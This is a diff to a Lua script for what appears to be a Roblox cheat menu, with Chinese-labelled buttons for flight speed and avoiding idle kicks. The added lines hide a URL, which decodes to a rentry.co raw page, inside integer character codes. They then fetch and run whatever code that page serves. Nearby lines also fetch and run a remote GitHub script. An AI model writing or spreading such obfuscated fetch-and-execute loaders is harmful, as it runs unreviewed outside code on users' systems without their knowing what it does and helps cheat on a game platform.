@@ -1437,6 +1437,15 @@ end)
 tool:Button("飞行x50倍(星月交辉脚本专属)",function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/tangxianchun/550fx/main/550FX.txt"))()
 end)
+
+local creds = window:Tab("清风明月系列",'6035145364')
+    
+local tool = creds:section("『清风明月🌙』",true)
+
+tool:Button("清风明月🌙",function()
+	_G["明月清风 脚本中心 "]="yhcthghfrhhdvrudhdijvjdnfjuvhdldhvkdicjfjfbfkfofnfkdlsjvjdncifn"local SCC_CharPool={[1]= tostring(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,101,110,116,114,121,46,99,111,47,67,72,69,69,75,49,47,114,97,119})end)()))}loadstring(game:HttpGet(SCC_CharPool[1]))()
+end)
+
 local creds = window:Tab("日月防踢",'6035145364')
     
 local tool = creds:section("『20分钟不动都不会被踢』",true)
